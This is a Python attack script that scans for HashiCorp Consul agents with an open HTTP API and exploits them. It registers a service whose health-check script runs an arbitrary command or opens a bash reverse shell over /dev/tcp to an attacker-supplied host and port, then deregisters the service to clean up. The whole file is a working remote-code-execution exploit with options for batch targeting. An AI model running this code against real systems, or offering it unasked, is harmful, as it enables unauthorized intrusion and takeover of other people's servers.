import requests
import argparse
import time

SLEEP = 15
CHECK_REQ_TIMEOUT = 2

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--infile', help = 'read targets from input file with one per line. eg 10.50.30.10:8500', action = 'store')
    parser.add_argument('--targets', help = 'single target or comma-separated list of targets with :port', action = 'store')
    parser.add_argument('--lport', help = 'local port listening for reverse shell', action = 'store')
    parser.add_argument('--lhost', help = 'local ip to send reverse shell to', action = 'store')
    parser.add_argument('--exploit', help = 'exploit a vulnerable target', action = 'store_true')
    parser.add_argument('--cmd', help = 'command to execute on exploited hosts', action = 'store')
    args = parser.parse_args()

    if args.targets or args.infile:
        clean_targets = []
        if args.targets:
            clean_targets = [x.strip() for x in (args.targets).split(',')]
        else:
            with open(args.infile) as f:
                for line in f:
                    clean_targets.append(line.strip())

        for target in clean_targets:
            check(target)

        if args.exploit:
            clean_targets = [x.strip() for x in (args.targets).split(',')]
            if len(clean_targets) == 1 and args.lport != '' and args.lhost != '':
                if register_service(clean_targets[0], args.lhost, args.lport, 0, True):
                    time.sleep(SLEEP)
                    if not deregister_service(clean_targets[0], args.lhost, args.lport):
                        error('failed to deregister newly created service (manual clean up required) on ' + clean_targets[0])
                else:
                    error('failed to register a new service')
            elif args.cmd:
                for target in clean_targets:
                    if register_service(target, 0, 0, args.cmd, False):
                        time.sleep(SLEEP)
                        if not deregister_service(target, args.lhost, args.lport):
                            error('failed to deregister newly created service (manual clean up required) on ' + target)
                    else:
                        error('failed to register a new service')
            else:
                error('provide your IP address and port for your netcat listener')
    else:
        error('no targets provided')

def error(msg):
    print('[!] Error: ' + msg)

def check(target):
    try:
        response = requests.get('http://' + target + '/v1/agent/services', timeout = CHECK_REQ_TIMEOUT)
        if response.status_code == 200:
            print('[+] Vulnerable: ' + target)
    except requests.exceptions.Timeout as e:
        pass

def register_service(target, lhost, lport, cmd, isshell):
    try:
        headers = {'Content-Type' : 'application/json'}
        script = cmd
        if isshell:
            script = 'bash -i >& /dev/tcp/' + lhost + '/' + lport +' 0>&1'
        data = {'ID' : 'testservice', 'Name' : 'testservice', 'Address' : '127.0.0.1', 'Port': 80, 'check' : {'script': script, 'interval' : '10s'}}
        response = requests.put('http://' + target + '/v1/agent/service/register', headers = headers, json = data, timeout = 5)

        if response.status_code == 200:
            print('[+] Registered service on ' + target)
            return True
    except requests.exceptions.Timeout as e:
        return False
    return False

def deregister_service(target, lhost, lport):
    try:
        headers = {'Content-Type' : 'application/json'}
        response = requests.put('http://' + target + '/v1/agent/service/deregister/testservice', timeout = 5)

        if response.status_code == 200:
            print('[+] Deregistered service on ' + target)
            return True
        else:
            print(response.status_code)
    except requests.exceptions.Timeout as e:
        return False
    return False

if __name__ == '__main__':
    main()